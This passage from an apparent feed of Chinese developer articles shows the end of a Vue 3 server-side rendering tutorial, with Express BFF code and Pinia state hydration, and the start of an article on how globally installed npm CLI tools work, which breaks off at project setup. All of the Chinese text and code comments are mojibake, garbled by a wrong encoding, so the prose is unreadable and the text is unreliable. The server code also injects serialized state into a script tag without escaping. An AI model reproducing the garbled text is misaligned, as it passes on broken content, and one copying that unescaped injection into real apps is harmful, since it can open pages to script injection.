Â Â <span class="hljs-keyword">const</span>Â stateÂ =Â pinia.<span class="hljs-property">state</span>.<span class="hljs-property">value</span>;
Â Â <span class="hljs-keyword">return</span>Â {Â html,Â stateÂ };
}
</code></pre>
<p><strong>å®¢æˆ·ç«¯å…¥å£ <code>entry-client.js</code>ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>Â {Â createAppÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">"./main.js"</span>;

<span class="hljs-keyword">async</span>Â <span class="hljs-keyword">function</span>Â <span class="hljs-title function_">hydrate</span>(<span class="hljs-params"/>)Â {
Â Â <span class="hljs-keyword">const</span>Â {Â app,Â router,Â piniaÂ }Â =Â <span class="hljs-title function_">createApp</span>();

Â Â <span class="hljs-keyword">await</span>Â router.<span class="hljs-title function_">isReady</span>();

Â Â <span class="hljs-comment">//Â è¿˜åŸæœåŠ¡ç«¯çŠ¶æ€</span>
Â Â <span class="hljs-keyword">if</span>Â (<span class="hljs-variable language_">window</span>.<span class="hljs-property">__PINIA_STATE__</span>)Â {
Â Â Â Â pinia.<span class="hljs-property">state</span>.<span class="hljs-property">value</span>Â =Â <span class="hljs-variable language_">window</span>.<span class="hljs-property">__PINIA_STATE__</span>;
Â Â }

Â Â <span class="hljs-comment">//Â æ¿€æ´»æœåŠ¡ç«¯æ¸²æŸ“çš„Â HTML</span>
Â Â app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">"#app"</span>);
}

<span class="hljs-title function_">hydrate</span>();
</code></pre>
<h4 data-id="heading-6">2. BFF æœåŠ¡å™¨å®ç°</h4>
<p>è¿™æ˜¯æ•´ä¸ª SSR çš„æ ¸å¿ƒâ€”â€”<code>server.js</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>Â expressÂ <span class="hljs-keyword">from</span>Â <span class="hljs-string">"express"</span>;
<span class="hljs-keyword">import</span>Â {Â renderToStringÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">"vue/server-renderer"</span>;

<span class="hljs-keyword">async</span>Â <span class="hljs-keyword">function</span>Â <span class="hljs-title function_">createServer</span>(<span class="hljs-params"/>)Â {
Â Â <span class="hljs-keyword">const</span>Â appÂ =Â <span class="hljs-title function_">express</span>();

Â Â <span class="hljs-comment">//Â ==========Â BFFÂ APIÂ æ¥å£Â ==========</span>
Â Â app.<span class="hljs-title function_">get</span>(<span class="hljs-string">"/api/hello"</span>,Â <span class="hljs-function">(<span class="hljs-params">req,Â res</span>)Â =&gt;</span>Â {
Â Â Â Â res.<span class="hljs-title function_">json</span>({
Â Â Â Â Â Â <span class="hljs-attr">message</span>:Â <span class="hljs-string">"ä½ å¥½ï¼Œè¿™æ˜¯æ¥è‡ªÂ NodeÂ BFFÂ çš„å“åº”ï¼"</span>,
Â Â Â Â Â Â <span class="hljs-attr">timestamp</span>:Â <span class="hljs-keyword">new</span>Â <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),
Â Â Â Â });
Â Â });

Â Â <span class="hljs-comment">//Â ==========Â SSRÂ æ¸²æŸ“Â ==========</span>
Â Â app.<span class="hljs-title function_">use</span>(<span class="hljs-string">"*"</span>,Â <span class="hljs-keyword">async</span>Â (req,Â res)Â =&gt;Â {
Â Â Â Â <span class="hljs-keyword">const</span>Â urlÂ =Â req.<span class="hljs-property">originalUrl</span>;

Â Â Â Â <span class="hljs-comment">//Â 1.Â è¯»å–Â HTMLÂ æ¨¡æ¿</span>
Â Â Â Â <span class="hljs-keyword">let</span>Â templateÂ =Â fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"index.html"</span>,Â <span class="hljs-string">"utf-8"</span>);

Â Â Â Â <span class="hljs-comment">//Â 2.Â åŠ è½½æœåŠ¡ç«¯å…¥å£</span>
Â Â Â Â <span class="hljs-keyword">const</span>Â {Â renderÂ }Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-keyword">import</span>(<span class="hljs-string">"./src/entry-server.js"</span>);

Â Â Â Â <span class="hljs-comment">//Â 3.Â æ‰§è¡Œæ¸²æŸ“</span>
Â Â Â Â <span class="hljs-keyword">const</span>Â {Â <span class="hljs-attr">html</span>:Â appHtml,Â stateÂ }Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">render</span>(url);

Â Â Â Â <span class="hljs-comment">//Â 4.Â æ³¨å…¥æ¸²æŸ“ç»“æœ</span>
Â Â Â Â <span class="hljs-keyword">let</span>Â finalHtmlÂ =Â template.<span class="hljs-title function_">replace</span>(<span class="hljs-string">"&lt;!--ssr-outlet--&gt;"</span>,Â appHtml);

Â Â Â Â <span class="hljs-comment">//Â 5.Â æ³¨å…¥åˆå§‹çŠ¶æ€</span>
Â Â Â Â finalHtmlÂ =Â finalHtml.<span class="hljs-title function_">replace</span>(
Â Â Â Â Â Â <span class="hljs-string">"&lt;/head&gt;"</span>,
Â Â Â Â Â Â <span class="hljs-string">`&lt;script&gt;window.__PINIA_STATE__Â =Â <span class="hljs-subst">${<span class="hljs-built_in">JSON</span>.stringify(
Â Â Â Â Â Â Â Â state
Â Â Â Â Â Â )}</span>&lt;/script&gt;&lt;/head&gt;`</span>
Â Â Â Â );

Â Â Â Â <span class="hljs-comment">//Â 6.Â è¿”å›å®Œæ•´Â HTML</span>
Â Â Â Â res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">set</span>({Â <span class="hljs-string">"Content-Type"</span>:Â <span class="hljs-string">"text/html"</span>Â }).<span class="hljs-title function_">end</span>(finalHtml);
Â Â });

Â Â app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
}
</code></pre>
<h4 data-id="heading-7">3. çŠ¶æ€ç®¡ç†ä¸ Hydration</h4>
<p>SSR æœ€å…³é”®çš„ä¸€æ­¥æ˜¯ <strong>çŠ¶æ€åŒæ­¥</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">  æœåŠ¡ç«¯æ¸²æŸ“æ—¶Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â å®¢æˆ·ç«¯æ¿€æ´»æ—¶
Â Â Â Â Â â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
Â Â Â Â Â â–¼Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Â Â PiniaÂ çŠ¶æ€Â Â â”‚Â â”€â”€åºåˆ—åŒ–æ³¨å…¥<span class="hljs-selector-tag">HTML</span>â”€â”€â†’Â â”‚Â Â è¿˜åŸçŠ¶æ€Â Â Â â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Â Â Â Â Â â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
Â Â Â Â Â â–¼Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â–¼
Â Â æ¸²æŸ“Â <span class="hljs-selector-tag">HTML</span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Hydration
</code></pre>
<p>æœåŠ¡ç«¯ä¼šå°† Pinia çŠ¶æ€åºåˆ—åŒ–åæ³¨å…¥åˆ° HTML ä¸­ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
Â Â <span class="hljs-variable language_">window</span>.<span class="hljs-property">__PINIA_STATE__</span>Â =Â {Â <span class="hljs-attr">counter</span>:Â {Â <span class="hljs-attr">count</span>:Â <span class="hljs-number">5</span>Â }Â };
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>å®¢æˆ·ç«¯åŠ è½½åè¯»å–è¿™ä¸ªçŠ¶æ€ï¼Œç¡®ä¿ Hydration æ—¶çŠ¶æ€ä¸€è‡´ï¼Œé¿å…"é—ªçƒ"é—®é¢˜ã€‚</p>
<h3 data-id="heading-8">SSR å®Œæ•´æµç¨‹</h3>
<p>æ•´ä¸ª SSR çš„å·¥ä½œæµç¨‹å¯ä»¥æ€»ç»“ä¸ºï¼š</p>
<pre><code class="hljs language-css" lang="css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â SSRÂ å®Œæ•´æµç¨‹Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
Â Â Â Â Â Â Â Â â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
Â Â Â Â Â Â Â Â â–¼Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â–¼
Â Â Â ã€æœåŠ¡ç«¯é˜¶æ®µã€‘Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ã€å®¢æˆ·ç«¯é˜¶æ®µã€‘
Â Â Â Â Â Â Â Â â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
Â Â Â <span class="hljs-number">1</span>.Â æ¥æ”¶è¯·æ±‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">4</span>.Â æµè§ˆå™¨æ˜¾ç¤ºÂ <span class="hljs-selector-tag">HTML</span>
Â Â Â Â Â Â Â Â â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
Â Â Â <span class="hljs-number">2</span>.Â VueÂ ç»„ä»¶æ¸²æŸ“ä¸ºÂ <span class="hljs-selector-tag">HTML</span>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">5</span>.Â åŠ è½½å®¢æˆ·ç«¯Â JS
Â Â Â Â Â Â Â Â â”‚Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
Â Â Â <span class="hljs-number">3</span>.Â æ³¨å…¥çŠ¶æ€å¹¶è¿”å›Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">6</span>.Â HydrationÂ æ¿€æ´»
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â â”‚
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">7</span>.Â åº”ç”¨å¯äº¤äº’Â âœ¨
</code></pre>
<h3 data-id="heading-9">å¼€å‘ä¸ç”Ÿäº§ç¯å¢ƒ</h3>
<p>é¡¹ç›®æ”¯æŒä¸¤ç§è¿è¡Œæ¨¡å¼ï¼š</p>

















<table><thead><tr><th>æ¨¡å¼</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td><strong>å¼€å‘æ¨¡å¼</strong></td><td>é›†æˆ Viteï¼Œæ”¯æŒ HMR çƒ­æ›´æ–°</td></tr><tr><td><strong>ç”Ÿäº§æ¨¡å¼</strong></td><td>é¢„æ„å»ºäº§ç‰©ï¼Œæ€§èƒ½æ›´ä¼˜</td></tr></tbody></table>
<pre><code class="hljs language-arduino" lang="arduino">#Â å¼€å‘æ¨¡å¼
npmÂ runÂ dev

#Â ç”Ÿäº§æ„å»ºÂ +Â å¯åŠ¨
npmÂ runÂ build
npmÂ runÂ serve
</code></pre>
<h3 data-id="heading-10">åŠŸèƒ½æ¼”ç¤º</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9ae479b1d7d479f80a6497880848620~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNDA05pif55CD55qE54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768403927&amp;x-signature=l6zHoj13TmSZjTVsHV4ALc5m0w8%3D" alt="åŠŸèƒ½æ¼”ç¤º" loading="lazy"/></p>
<p>æ¼”ç¤ºå†…å®¹ï¼š</p>
<ul>
<li>â€¢ âœ… è®¡æ•°å™¨çŠ¶æ€ç®¡ç†ï¼ˆPiniaï¼‰</li>
<li>â€¢ âœ… BFF API è°ƒç”¨ï¼ˆExpressï¼‰</li>
<li>â€¢ âœ… è·¯ç”±åˆ‡æ¢ï¼ˆVue Routerï¼‰</li>
<li>â€¢ âœ… å®¢æˆ·ç«¯ Hydration</li>
</ul>
<h3 data-id="heading-11">æ€»ç»“</h3>
<p>é€šè¿‡è¿™ä¸ªé¡¹ç›®ï¼Œæˆ‘å®ç°äº†ä¸€ä¸ªå®Œæ•´çš„ Vue 3 SSR åº”ç”¨ï¼Œæ ¸å¿ƒè¦ç‚¹ï¼š</p>
<ol>
<li>
<ol>
<li><strong>BFF æ¶æ„</strong>ï¼šNode.js åŒæ—¶æ‰¿æ‹… API æœåŠ¡å’Œ SSR æ¸²æŸ“èŒè´£</li>
</ol>
</li>
<li>
<ol start="2">
<li><strong>å…¥å£åˆ†ç¦»</strong>ï¼šæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯å„è‡ªæœ‰ç‹¬ç«‹çš„å…¥å£æ–‡ä»¶</li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>çŠ¶æ€åŒæ­¥</strong>ï¼šæœåŠ¡ç«¯çŠ¶æ€åºåˆ—åŒ–æ³¨å…¥ HTMLï¼Œå®¢æˆ·ç«¯è¿˜åŸå Hydration</li>
</ol>
</li>
<li>
<ol start="4">
<li><strong>Vite åŠ æŒ</strong>ï¼šå¼€å‘ä½“éªŒæä½³ï¼ŒHMR ç§’çº§åˆ·æ–°</li>
</ol>
</li>
</ol>
<p>å¦‚æœä½ ä¹Ÿæƒ³äº†è§£ SSRï¼Œæ¬¢è¿ Clone è¿™ä¸ªé¡¹ç›®å­¦ä¹ ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">  gitÂ <span class="hljs-built_in">clone</span>Â https://github.com/xiaogao007/vue3-ssr-demo
</code></pre>
<hr/>
<p><strong>ä½œè€…ï¼šå°é«˜</strong><br/>
<strong>é¡¹ç›®åœ°å€ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaogao007%2Fvue3-ssr-demo" target="_blank" title="https://github.com/xiaogao007/vue3-ssr-demo" ref="nofollow noopener noreferrer">vue3-ssr-demo</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦æ‹†è§£ï¼šä» npm install åˆ°æ‰‹å†™ä¸€ä¸ªå…¨å±€ CLI å·¥å…·]]></title>    <link>https://juejin.cn/post/7592759902675468334</link>    <guid>https://juejin.cn/post/7592759902675468334</guid>    <pubDate>2026-01-08T02:01:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759902675468334" data-draft-id="7592552501579022362" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦æ‹†è§£ï¼šä» npm install åˆ°æ‰‹å†™ä¸€ä¸ªå…¨å±€ CLI å·¥å…·"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:01:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€šæ å¬é£é›¨"/> <meta itemprop="url" content="https://juejin.cn/user/2682464103830750"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦æ‹†è§£ï¼šä» npm install åˆ°æ‰‹å†™ä¸€ä¸ªå…¨å±€ CLI å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2682464103830750/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€šæ å¬é£é›¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:01:59.000Z" title="Thu Jan 08 2026 02:01:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸æ‰§è¡Œ <code>npm install @vue/cli -g</code>ã€‚æ‰§è¡Œå®Œåï¼Œä¸ºä»€ä¹ˆå°±èƒ½åœ¨ç»ˆç«¯éšå¤„è¾“å…¥ <code>vue</code> å‘½ä»¤ï¼Ÿç”µè„‘èƒŒååšäº†ä»€ä¹ˆï¼Ÿå¦‚ä½•æ‹¥æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„å‘½ä»¤ï¼Ÿæœ¬æ–‡å°†å¸¦ä½ ä¸€æ¢ç©¶ç«Ÿã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ å‘½ä»¤æ‹†è§£ï¼š<code>npm install @vue/cli -g</code></h2>
<ul>
<li><strong>npm</strong>: Node åŒ…ç®¡ç†å™¨ï¼Œè´Ÿè´£ä¸‹è½½ã€å®‰è£…å’Œç®¡ç†ä¾èµ–ã€‚</li>
<li><strong>install (i)</strong>: å‘Šè¯‰ npm æ‰§è¡Œå®‰è£…åŠ¨ä½œã€‚</li>
<li><strong>@vue/cli</strong>: åŒ…åã€‚<code>@vue</code> æ˜¯ç»„ç»‡å‘½åç©ºé—´ï¼Œ<code>cli</code> æ˜¯å…·ä½“å·¥å…·ã€‚</li>
<li><strong>-g (Global)</strong>: <strong>å…³é”®å‚æ•°</strong>ã€‚è¡¨ç¤ºå…¨å±€å®‰è£…ï¼Œè¿™æ˜¯å‘½ä»¤èƒ½â€œéšå¤„å¯ç”¨â€çš„å‰æã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-1">äºŒã€ æ ¸å¿ƒåŸç†ï¼šä¸ºä»€ä¹ˆå…¨å±€å®‰è£…åå‘½ä»¤èƒ½éšå¤„å¯ç”¨ï¼Ÿ</h2>
<p>å½“ä½ æŒ‰ä¸‹å›è½¦é”®æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿå†…éƒ¨ç»å†äº†ä¸€åœºâ€œæ¥åŠ›èµ›â€ï¼š</p>
<h3 data-id="heading-2">1. å¯»æ‰¾â€œå¿«æ·æ–¹å¼â€</h3>
<p>åœ¨ Windows æˆ– macOS/Linux ä¸­ï¼Œç³»ç»Ÿéƒ½æœ‰ä¸€ä¸ªç¯å¢ƒå˜é‡å« <strong>PATH</strong>ã€‚</p>
<ul>
<li>å½“ä½ å…¨å±€å®‰è£…åŒ…æ—¶ï¼Œnpm ä¼šæŠŠåŒ…ä¸‹è½½åˆ°å…¨å±€ç›®å½•ï¼Œå¹¶åŒæ—¶åœ¨ç³»ç»Ÿçš„ PATH è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ª<strong>åŒåçš„å¿«æ·æ–¹å¼ï¼ˆè½¯é“¾æ¥ï¼‰</strong>ã€‚</li>
<li>å½“ä½ è¾“å…¥ <code>vue</code> æ—¶ï¼ŒShellï¼ˆç»ˆç«¯ï¼‰ä¼šå» PATH åŒ…å«çš„æ–‡ä»¶å¤¹é‡ŒæŒ¨ä¸ªæ‰¾ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†è¿™ä¸ªå¿«æ·æ–¹å¼ã€‚</li>
</ul>
<h3 data-id="heading-3">2. è¯†åˆ«â€œè§£é‡Šå™¨â€ï¼ˆShebangï¼‰</h3>
<p>æ‰¾åˆ°æ–‡ä»¶åï¼Œç³»ç»Ÿä¼šè¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œã€‚é€šå¸¸ CLI å·¥å…·çš„ç¬¬ä¸€è¡Œæ˜¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">#!/usr/bin/env node</span>
</code></pre>
<p>è¿™è¡Œä»£ç å« <strong>Shebang</strong>ã€‚å®ƒå‘Šè¯‰æ“ä½œç³»ç»Ÿï¼šâ€œè™½ç„¶è¿™çœ‹èµ·æ¥æ˜¯ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œä½†è¯·è°ƒç”¨ <strong>Node.js</strong> æ¥è¿è¡Œæˆ‘â€ã€‚</p>
<h3 data-id="heading-4">3. è¿è¡Œè„šæœ¬</h3>
<p>ç³»ç»Ÿå¯åŠ¨ Node.jsï¼Œå¹¶å°†å‰©ä¸‹çš„å‚æ•°ï¼ˆå¦‚ <code>create my-project</code>ï¼‰ä¼ é€’ç»™è„šæœ¬ï¼Œè„šæœ¬å¼€å§‹æ‰§è¡Œé€»è¾‘ï¼ˆå¦‚åˆ›å»ºæ–‡ä»¶å¤¹ã€æ‹‰å–æ¨¡æ¿ï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€ å®æˆ˜ï¼šæ‰‹å†™ä¸€ä¸ªè‡ªå·±çš„ CLI å‘½ä»¤</h2>
<p>ç†è§£å‘½ä»¤æœ€å¥½çš„æ–¹å¼æ˜¯è‡ªå·±å†™ä¸€ä¸ªã€‚</p>
<h3 data-id="heading-6">1. åˆå§‹åŒ–é¡¹ç›®</h3>
